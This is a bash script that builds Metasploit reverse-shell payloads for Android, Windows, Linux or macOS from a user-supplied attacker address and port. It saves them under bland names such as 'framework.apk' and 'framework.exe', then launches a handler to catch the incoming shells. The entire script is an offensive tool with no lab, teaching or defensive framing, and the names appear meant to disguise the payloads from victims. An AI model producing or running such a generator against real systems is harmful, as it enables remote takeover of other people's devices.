#!/bin/bash

echo "Select the target operating system:"
echo "1: Android"
echo "2: Windows"
echo "3: Linux"
echo "4: MacOS"
read -p "Enter your choice (1-4): " os_choice

read -p "Enter LHOST: " lhost
read -p "Enter LPORT: " lport

case $os_choice in
  1)
    echo "[*] Generating payload for Android..."
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o framework.apk
    echo "[*] Payload saved as 'framework.apk'"
    ;;
  2)
    echo "[*] Generating payload for Windows..."
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > framework.exe
    echo "[*] Payload saved as 'framework.exe'"
    ;;
  3)
    echo "[*] Generating payload for Linux..."
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > linux_payload.elf
    echo "[*] Payload saved as 'linux_payload.elf'"
    ;;
  4)
    echo "[*] Generating payload for MacOS..."
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > mac_payload.macho
    echo "[*] Payload saved as 'mac_payload.macho'"
    ;;
  *)
    echo "[!] Invalid choice. Exiting."
    exit 1
    ;;
esac

# Start Metasploit Console with Listener
echo "[*] Setting up Metasploit listener..."
msfconsole -q -x "use exploit/multi/handler;
set PAYLOAD $(case $os_choice in
  1) echo android/meterpreter/reverse_tcp ;;
  2) echo windows/meterpreter/reverse_tcp ;;
  3) echo linux/x86/meterpreter/reverse_tcp ;;
  4) echo osx/x86/shell_reverse_tcp ;;
esac);
set LHOST $lhost;
set LPORT $lport;
exploit;"
